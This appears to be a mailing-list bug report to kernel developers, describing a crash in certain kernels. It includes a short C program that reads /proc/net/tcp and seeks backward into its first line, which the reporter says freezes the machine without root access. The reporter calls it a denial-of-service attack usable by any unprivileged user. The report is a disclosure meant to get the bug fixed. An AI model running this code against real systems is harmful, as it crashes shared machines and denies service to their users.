  Hi,
  The following code instantly freezes my all of my machines running 
 any of the beavers:
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    #include <unistd.h>
    #include <stdio.h>
    int main(void) {
            char buf[8192];
            int fd, chars;
            fd = open("/proc/net/tcp", O_RDONLY);
            chars = read(fd, buf, sizeof(buf));
            lseek(fd, -chars+1, SEEK_CUR);
            close(fd);
            return 0;
    }
  It only happens when I lseek() anywhere from -chars+1 to -chars+150
 inclusive (in other words, somewhere on the first line).  I do not
 need root to abuse this, which makes it an excellent DoS attack for
 anyone with an unprivileged account.
  I do get an oops, but as I do not have a serial console I'd rather
 not transcribe it to paper and post it unless it's crucial to
 pinpointing the bug.
